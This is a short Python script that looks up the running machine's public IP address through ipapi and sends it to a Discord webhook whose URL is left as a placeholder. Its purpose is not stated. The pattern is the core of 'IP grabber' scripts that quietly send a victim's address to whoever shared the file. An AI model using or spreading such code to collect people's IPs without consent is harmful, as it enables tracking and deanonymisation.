import ipapi
from discord_webhook import DiscordWebhook

ip = ipapi.location(None, None, 'ip')
webhook = DiscordWebhook(url='webhook url goes here', content=ip)
response = webhook.execute()
